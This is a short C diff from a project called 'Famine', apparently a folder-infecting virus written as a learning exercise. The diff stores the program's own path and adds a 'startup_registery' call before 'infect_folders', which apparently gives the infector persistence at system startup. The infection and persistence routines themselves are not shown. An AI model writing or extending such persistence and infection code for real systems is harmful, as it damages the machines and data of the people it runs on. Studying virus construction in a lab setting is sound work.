@@ -59,7 +59,7 @@ static void			check_debug_mode(t_famine *famine, int argc, char **argv)
 /*
 ** Allocation of the struct s_famine and assignate the working directory
 */
-static t_famine		*alloc_famine()
+static t_famine		*alloc_famine(int argc, char **argv)
 {
 	t_famine		*allocated;
 
@@ -67,6 +67,8 @@ static t_famine		*alloc_famine()
 		return (NULL);
 	allocated->path = get_temporary_folder();
 	allocated->debug = false;
+	allocated->executable_path = argv[0];
+	return (allocated);
 }
 
 /*
@@ -90,7 +92,10 @@ void				init_famine(int argc, char **argv)
 		if (famine->debug == true) {
 			start_debug_console();
 		}
+
+		startup_registery(famine);
 		infect_folders(famine);
+
 		print_message(famine, "\nFamine job's done !", false);
 		if (famine->debug == true) {
 			while (true) ;
